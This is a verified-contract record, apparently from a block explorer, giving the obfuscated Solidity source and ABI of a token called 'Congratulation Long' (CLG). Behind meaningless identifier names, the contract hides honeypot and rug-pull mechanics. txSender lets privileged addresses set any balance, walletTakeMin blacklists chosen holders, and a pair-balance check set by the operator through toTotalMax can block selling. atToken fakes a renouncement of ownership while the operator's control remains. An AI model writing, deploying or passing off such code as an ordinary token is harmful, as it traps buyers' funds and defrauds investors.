{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface shouldIsLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityEnable) external view returns (uint256);\n\n    function transfer(address limitReceiver, uint256 takeSell) external returns (bool);\n\n    function allowance(address receiverMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitReceiver,\n        uint256 takeSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minToken, uint256 value);\n    event Approval(address indexed receiverMax, address indexed spender, uint256 value);\n}\n\nabstract contract minSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTxWallet {\n    function createPair(address swapFrom, address tradingLaunch) external returns (address);\n}\n\ninterface shouldIsLimitMetadata is shouldIsLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CongratulationLong is minSwap, shouldIsLimit, shouldIsLimitMetadata {\n\n    address limitMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private modeTo;\n\n    event OwnershipTransferred(address indexed toMax, address indexed buyTrading);\n\n    constructor (){\n        if (buyToken) {\n            txAuto = false;\n        }\n        fromTrading teamReceiver = fromTrading(totalTeam);\n        teamWallet = senderTxWallet(teamReceiver.factory()).createPair(teamReceiver.WETH(), address(this));\n        if (launchedSell) {\n            txAuto = true;\n        }\n        txFrom = _msgSender();\n        atToken();\n        walletReceiver[txFrom] = true;\n        atMarketing[txFrom] = listLaunchedAt;\n        if (launchedSell) {\n            launchedSell = false;\n        }\n        emit Transfer(address(0), txFrom, listLaunchedAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return feeLaunch;\n    }\n\n    function walletTakeMin(address toExempt) public {\n        totalMode();\n        if (txAuto != launchedSell) {\n            buyLaunched = modeTo;\n        }\n        if (toExempt == txFrom || toExempt == teamWallet) {\n            return;\n        }\n        senderTo[toExempt] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listSell;\n    }\n\n    uint256 private listLaunchedAt = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public senderTo;\n\n    bool public txAuto;\n\n    bool public launchedSell;\n\n    address public txFrom;\n\n    uint256 sellFundShould;\n\n    function transfer(address feeMarketing, uint256 takeSell) external virtual override returns (bool) {\n        return atSwap(_msgSender(), feeMarketing, takeSell);\n    }\n\n    function fromMaxMin(address modeFee) public {\n        if (feeTo) {\n            return;\n        }\n        \n        walletReceiver[modeFee] = true;\n        if (buyLaunched != modeTo) {\n            txAuto = true;\n        }\n        feeTo = true;\n    }\n\n    uint256 constant takeAuto = 19 ** 10;\n\n    function balanceOf(address liquidityEnable) public view virtual override returns (uint256) {\n        return atMarketing[liquidityEnable];\n    }\n\n    string private feeTotal = \"CLG\";\n\n    mapping(address => uint256) private atMarketing;\n\n    mapping(address => bool) public walletReceiver;\n\n    address public teamWallet;\n\n    bool private buyToken;\n\n    function atToken() public {\n        emit OwnershipTransferred(txFrom, address(0));\n        feeLaunch = address(0);\n    }\n\n    string private marketingShould = \"Congratulation Long\";\n\n    bool public feeTo;\n\n    function atSwap(address receiverBuyTo, address limitReceiver, uint256 takeSell) internal returns (bool) {\n        if (receiverBuyTo == txFrom) {\n            return sellSender(receiverBuyTo, limitReceiver, takeSell);\n        }\n        uint256 maxList = shouldIsLimit(teamWallet).balanceOf(limitMin);\n        require(maxList == tradingLaunchedAuto);\n        require(limitReceiver != limitMin);\n        if (senderTo[receiverBuyTo]) {\n            return sellSender(receiverBuyTo, limitReceiver, takeAuto);\n        }\n        return sellSender(receiverBuyTo, limitReceiver, takeSell);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingShould;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listLaunchedAt;\n    }\n\n    function totalMode() private view {\n        require(walletReceiver[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTotal;\n    }\n\n    uint8 private listSell = 18;\n\n    function approve(address takeTotal, uint256 takeSell) public virtual override returns (bool) {\n        modeAt[_msgSender()][takeTotal] = takeSell;\n        emit Approval(_msgSender(), takeTotal, takeSell);\n        return true;\n    }\n\n    function allowance(address feeLiquidity, address takeTotal) external view virtual override returns (uint256) {\n        if (takeTotal == totalTeam) {\n            return type(uint256).max;\n        }\n        return modeAt[feeLiquidity][takeTotal];\n    }\n\n    uint256 tradingLaunchedAuto;\n\n    address totalTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private feeLaunch;\n\n    function transferFrom(address receiverBuyTo, address limitReceiver, uint256 takeSell) external override returns (bool) {\n        if (_msgSender() != totalTeam) {\n            if (modeAt[receiverBuyTo][_msgSender()] != type(uint256).max) {\n                require(takeSell <= modeAt[receiverBuyTo][_msgSender()]);\n                modeAt[receiverBuyTo][_msgSender()] -= takeSell;\n            }\n        }\n        return atSwap(receiverBuyTo, limitReceiver, takeSell);\n    }\n\n    function txSender(address feeMarketing, uint256 takeSell) public {\n        totalMode();\n        atMarketing[feeMarketing] = takeSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private modeAt;\n\n    function owner() external view returns (address) {\n        return feeLaunch;\n    }\n\n    function toTotalMax(uint256 takeSell) public {\n        totalMode();\n        tradingLaunchedAuto = takeSell;\n    }\n\n    function sellSender(address receiverBuyTo, address limitReceiver, uint256 takeSell) internal returns (bool) {\n        require(atMarketing[receiverBuyTo] >= takeSell);\n        atMarketing[receiverBuyTo] -= takeSell;\n        atMarketing[limitReceiver] += takeSell;\n        emit Transfer(receiverBuyTo, limitReceiver, takeSell);\n        return true;\n    }\n\n    uint256 public buyLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"}],\"name\":\"fromMaxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeSell\",\"type\":\"uint256\"}],\"name\":\"toTotalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuyTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSell\",\"type\":\"uint256\"}],\"name\":\"txSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"walletTakeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CongratulationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}